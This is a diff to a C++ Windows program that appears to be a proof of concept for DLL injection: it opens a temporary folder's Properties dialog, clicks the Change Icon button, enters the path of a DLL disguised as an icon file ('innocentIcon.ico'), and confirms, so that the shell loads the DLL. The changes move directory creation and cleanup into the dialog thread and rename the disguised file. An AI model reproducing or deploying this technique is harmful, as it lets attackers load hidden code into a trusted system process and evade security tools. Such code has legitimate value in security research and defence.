@@ -41,6 +41,15 @@ BOOL CALLBACK getInjectionWindow(HWND hWnd, LPARAM lparam) {
 }
 
 void openChangeIcons() {
+    // Creates a directory in appdata\temp.
+    WCHAR tmpPath[MAX_PATH] = { 0 };
+    GetTempPath(MAX_PATH, tmpPath);
+
+    WCHAR* fullPath = new WCHAR[dirNameLen + wcslen(tmpPath)];
+    PathCombineW(fullPath, tmpPath, dirName);
+
+    CreateDirectoryW(fullPath, NULL);
+
     // Opens the properties window of the created directory.
     SHObjectProperties(NULL, SHOP_FILEPATH, fullPath, NULL);
 
@@ -62,17 +71,12 @@ void openChangeIcons() {
     // The Change Icon button is being clicked. 
     // This has to be executed in a separate thread because it returns after the Change Icon dialog has been closed.
     SendMessage(changeIcon, BM_CLICK, 0, 0);
+
+    // Remove direcotry.
+    RemoveDirectory(fullPath);
 }
 
 int main(){
-    // Creates a directory in appdata\temp.
-    WCHAR tmpPath[MAX_PATH] = { 0 };
-    GetTempPath(MAX_PATH, tmpPath);
-
-    WCHAR* fullPath = new WCHAR[dirNameLen + wcslen(tmpPath)];
-    PathCombineW(fullPath, tmpPath, dirName);
-
-    CreateDirectoryW(fullPath, NULL);
 
     // Opens the Change Icon dialog.
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)openChangeIcons, 0, 0, 0);
@@ -89,7 +93,7 @@ int main(){
     PathRemoveFileSpec(exePath);
 
     WCHAR dllPath[MAX_PATH];
-    PathCombineW(dllPath, exePath, L"hiImJustAnIcon.ico");
+    PathCombineW(dllPath, exePath, L"innocentIcon.ico");
 
     // Retrives the handle to the input field and puts in the path of the DLL (in this case with an .ico extension)
     HWND edit = GetWindow(GetWindow(iconDialog, GW_CHILD), GW_HWNDNEXT);
@@ -98,7 +102,4 @@ int main(){
     // Clicks the ok button.
     HWND ok = GetWindow(GetWindow(GetWindow(iconDialog, GW_CHILD), GW_HWNDLAST), GW_HWNDPREV);
     SendMessage(ok, BM_CLICK, 0, 0);
-
-    // TODO
-    RemoveDirectory(fullPath);
 }
